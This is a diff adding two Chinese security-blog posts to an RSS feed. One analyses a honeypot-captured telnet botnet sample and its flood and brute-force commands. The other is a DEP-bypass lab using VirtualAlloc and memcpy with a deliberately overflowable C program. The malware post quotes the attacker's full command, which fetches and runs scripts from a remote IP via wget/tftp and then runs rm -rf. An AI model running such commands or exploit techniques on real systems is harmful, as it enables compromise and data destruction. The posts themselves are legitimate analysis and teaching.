@@ -9,6 +9,277 @@
     
       
       <item>
+        <title>MalwareMustDie Gucci样本分析</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 背景&lt;/h1&gt;
+
+&lt;p&gt;在ssh蜜罐上捕获到恶意样本，执行的命令如下：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://212.47.239.249/justyzoat.sh; chmod 777 justyzoat.sh; sh justyzoat.sh; tftp 212.47.239.249 -c get tutftp1.sh; chmod 777 tutftp1.sh; sh tutftp1.sh; tftp -r tutftp2.sh -g 212.47.239.249; chmod 777 tutftp2.sh; sh tutftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 212.47.239.249 tuftp1.sh tuftp1.sh; sh tuftp1.sh; rm -rf justyzoat.sh tutftp1.sh tutftp2.sh tuftp1.sh; rm -rf *&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;后续分析过程中只能下载该ip的justyzoat.sh：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从ip下载不同架构上的二进制恶意样本，实现的功能都是telnet botnet的被控端，等待接收主控端ip的指令并执行。虽然该ip地址现已无法连接，并且主控端的ip被硬编码在二进制文件中，但是在&lt;a href=&quot;http://psbdmp.ws/KPgFrxAw&quot;&gt;psbdmp.ws&lt;/a&gt;上发现了疑似攻击者用来扫描ssh弱口令并执行命令的脚本，所以只要攻击者还会有所行动，ssh蜜罐还是可以捕获到的。&lt;/p&gt;
+
+&lt;p&gt;这个wget样本是ELF32文件，接下来会对该样本进行静态分析，并使用iptables对其控制调试。在分析完该样本后，我更愿意把它叫做gucci样本。&lt;/p&gt;
+
+&lt;h1 id=&quot;x01-&quot;&gt;0x01 静态分析功能&lt;/h1&gt;
+
+&lt;p&gt;样本是静态链接，又没strip，所以IDA反汇编看起来很轻松。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;接收指令部分&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;每5秒调用initConnection函数，去主动连接主控端ip 212.47.239.249的23端口：&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;recvLine函数接收指令后，指令需要满足”&lt;code&gt;!XXX cmd arg1 arg2 arg3 …&lt;/code&gt;“的格式才能传递给processCmd函数执行对应功能。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在判断cmd时稍微混淆了一下，本质还是cmp后进入对应逻辑：&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;htp&quot;&gt;HTP指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;HTP指令可接收2个参数，参数2（默认值为500）只要大于0就会调用htp(100,arg1)函数，来扫描公网ip 23端口的弱口令，并report给主控端。&lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;htp函数的100用来设置扫描过程中timeout的微秒值，函数内部会调用getdtablesize函数和arg1比较，取较大值作为扫描的并发数。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;扫描过程中每个文件描述符所用的结构体如下：&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;在爆破弱口令过程中，判断是否符合条件的字符串表如下：&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+    &lt;p&gt;htp函数中先是并发去连接公网ip的23端口，然后接收消息查看是否包含advances中的字符串，接着爆破弱口令，传递完账号密码后先判断是否有advances2字符串，然后判断是否有fails字符串，最后再判断是否有successes字符串。所以响应中有”#”时才会被认定为爆破成功。&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;爆破成功后默认会发送”&lt;code&gt;REPORT ip:username:password&lt;/code&gt;“至主控端sock。最后会发送相同的命令使主机执行justyzoat.sh。&lt;/p&gt;
+
+    &lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;udp&quot;&gt;UDP指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;UDP指令可接收6个参数，可对指定ip进行UDP flood。&lt;/li&gt;
+  &lt;li&gt;参数1为要攻击的ip地址，可为多个ip地址使用”&lt;code&gt;,&lt;/code&gt;“分割。&lt;/li&gt;
+  &lt;li&gt;参数2为要攻击的端口，如果为0则随机生成目的端口。&lt;/li&gt;
+  &lt;li&gt;参数3为攻击持续的时间。&lt;/li&gt;
+  &lt;li&gt;参数4决定是否伪造源ip地址，不可大于32，如果为32则不伪造源ip地址，否则会被传递给getRandomIP函数。&lt;/li&gt;
+  &lt;li&gt;参数5为udp数据包中data的长度，不可大于65500，会被传递给makeRandomStr函数生成随机字符串。&lt;/li&gt;
+  &lt;li&gt;参数6为每一次攻击sendto数据包的次数。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;tcp&quot;&gt;TCP指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;TCP指令可接收7个参数，可对指定ip进行TCP flood。&lt;/li&gt;
+  &lt;li&gt;参数1,2,3的功能和UDP指令相同，参数4也不可大于32，但是默认会伪造源ip地址。&lt;/li&gt;
+  &lt;li&gt;参数5指定TCP数据包的标志位，有”&lt;code&gt;all,syn,rst,fin,ack,psh,urg&lt;/code&gt;“这7种，可以使用”&lt;code&gt;,&lt;/code&gt;“组合。&lt;/li&gt;
+  &lt;li&gt;参数6,7则与UDP指令的参数5,6功能相同。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&quot;http&quot;&gt;HTTP指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;HTTP指令需要接收6个参数，可对指定的host进行HTTP flood。&lt;/li&gt;
+  &lt;li&gt;参数1指定HTTP method，参数2指定host，参数3指定port，参数4指定URL，参数5指定攻击持续的时间，参数6指定fork并发的数量。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;std&quot;&gt;STD指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;STD指令需要接收3个参数，可发送带有69字节data的UDP数据包。&lt;/li&gt;
+  &lt;li&gt;参数1为要发送的hostname，多个可以用”&lt;code&gt;,&lt;/code&gt;“分割，参数2指定网络字节序的port，参数3指定持续发包的时间。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;die&quot;&gt;DIE指令&lt;/h2&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;DIE指令是直接退出，结束被控端。&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h1 id=&quot;x02-iptables&quot;&gt;0x02 动态调试时使用iptables&lt;/h1&gt;
+
+&lt;p&gt;在主动连接过程中，因为是直接tcp连接硬编码的主控端ip地址，所以使用iptables做一下DNAT，也方便在本地控制调试被控端：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;sudo iptables -t nat -A OUTPUT -d 212.47.239.249 -j DNAT --to-destination 127.0.0.1&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;在调试HTP指令时，为了不让我们的主机去扫描公网的23端口，还是借用iptables再做一次DNAT：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;bash&quot;&gt;sudo iptables -t nat -A OUTPUT -p tcp --dport 23 -j DNAT --to-destination 127.0.0.2&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;所以在127.0.0.2我们可以监听端口，伪造一个可以登录的服务，可以记录到被控端向主控端上报爆破成功信息：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;但是其并发数一次性太高，索性gdb attach子进程，在getRandomPublicIP函数处下断点，并且patch原程序增大timeout等待时间（iptables处理耗时），这样也好查看流量，最终在伪造的23端口服务端可以看到其接受的消息：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171209/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x03-&quot;&gt;0x03 其他&lt;/h1&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;在HTTP flood中host的设定是没有加上端口的，在某些情况下会有点问题。&lt;/li&gt;
+  &lt;li&gt;可以使用nc连接主控端的23端口，实现一个简单的下发指令监控。&lt;/li&gt;
+&lt;/ol&gt;
+
+</description>
+        
+        <pubDate>Sat, 09 Dec 2017 00:00:00 +0800</pubDate>
+        <link>
+        https://larryxi.github.io/malwaremustdie-gucci-analysis.html</link>
+        <guid isPermaLink="true">https://larryxi.github.io/malwaremustdie-gucci-analysis.html</guid>
+      </item>
+      
+    
+      
+      <item>
+        <title>0day安全DEP绕过实验（下）</title>
+        
+          <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 实验环境&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;操作系统：xp sp3&lt;/li&gt;
+  &lt;li&gt;编译器：vs 2010&lt;/li&gt;
+  &lt;li&gt;编译选项：Release版本；开启DEP，关闭GS，SafeSEH，ASLR&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;x01-ret2libcvirtualalloc&quot;&gt;0x01 Ret2Libc实战之利用VirtualAlloc&lt;/h1&gt;
+
+&lt;p&gt;实验代码和书中类似：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;c&quot;&gt;#include &amp;quot;stdafx.h&amp;quot;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Windows.h&amp;gt;
+
+char shellcode[] = …;
+
+void test()
+{
+	char dest[240];
+	memcpy(dest, shellcode, 600);
+}
+
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	HINSTANCE hInst = LoadLibrary(_T(&amp;quot;shell32.dll&amp;quot;));
+	char str[400];
+	test();
+	return 0;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;这个实验主要是利用VirtualAlloc函数分配一段可执行的内存空间，然后使用memcpy函数把payload片段复制过去进而执行。依旧查看kernel32.dll的导出函数VirtualAlloc位于9AE1偏移处，内如逻辑如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;VirtualAlloc要求传入的参数都是硬编码即可，所以在test函数返回后push esp pop ebp retn 4后，即可安排ebp+8~ebp+14为对应的参数，然后跳转至VirtualAlloc内部执行，shellcode暂且布局为：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;跟进到要调用函数时，栈环境已经被我们安排好了：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;函数调用成功后就分配了一块可执行内存，接下来要做的就是使用memcpy函数，安排栈环境把payload复制过去。Memcpy中需要参数目的地址和复制大小都是我们已经确定的，源地址还要我们来动态确定，只要源地址在payload位置之前即可，因此可以使用push esp jmp eax来填充这个参数。由于在VirtualAlloc的末尾会pop ebp retn 10，所以还需要回复ebp以便后续利用memcpy，调整布局如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;在即将恢复好ebp后，我们可以看到esp会掉到ebp+8：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;而在memcpy函数的内部，ebp+8指向的是目的地址，ebp+c指向的是源地址，ebp+10指向的是复制长度。如果想在ebp+c中放入esp的值就需要在ebp+10中push esp，所以要让esp掉到ebp+10就可以使用pop retn，然后在ebp+10处放置的为push esp jmp eax，这样ebp+c处就为当前esp的值了，同时为了向下跨越8个字节调用memcpy，在eax中就可以设置为pop pop retn，最终布局如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;最后可见memcpy在即将返回时，正好会跳转至我们\x90填充的字节，如果更改为我们开辟的内存地址空间就可以转而去执行复制的payload了：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于我这里的payload是有16字节的nop填充，所以在memcpy之后碰巧没有出现异常情况，也就不用像书中那样微调一下payload了，最后exploit的效果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;x02-dep&quot;&gt;0x02 利用可执行内存跳转DEP&lt;/h1&gt;
+
+&lt;p&gt;实验代码和书中类似：&lt;/p&gt;
+
+&lt;div&gt;
+  &lt;pre&gt;&lt;code class=&quot;c&quot;&gt;#include &amp;quot;stdafx.h&amp;quot;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;Windows.h&amp;gt;
+
+char shellcode[] = …;
+
+void test()
+{
+	char dest[240];
+	memcpy(dest, shellcode, 600);
+}
+
+
+int _tmain(int argc, _TCHAR* argv[])
+{
+	HINSTANCE hInst = LoadLibrary(_T(&amp;quot;shell32.dll&amp;quot;));
+	VirtualAlloc((LPVOID)0x003d0000, 0x00001000, 0x00001000, 0x40);
+	char str[400];
+	test();
+	return 0;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;需要说明的是书中直接使用0x140000的可执行地址去memcpy，然而我也不知道这块RWE的地址是怎么来的，就在main函数中自己先VirtualAlloc了一块RWE地址，由于可执行地址我们有了，所以利用方法和上一个实验相似，只需要把payload memcpy过去就行了，最终exploit的效果如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ojyzyrhpd.bkt.clouddn.com/20171101/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
+        
+        <pubDate>Wed, 01 Nov 2017 00:00:00 +0800</pubDate>
+        <link>
+        https://larryxi.github.io/0day-dep-bypass-exercise-part2.html</link>
+        <guid isPermaLink="true">https://larryxi.github.io/0day-dep-bypass-exercise-part2.html</guid>
+      </item>
+      
+    
+      
+      <item>
         <title>0day安全DEP绕过实验（上）</title>
         
           <description>&lt;h1 id=&quot;x00-&quot;&gt;0x00 实验环境&lt;/h1&gt;
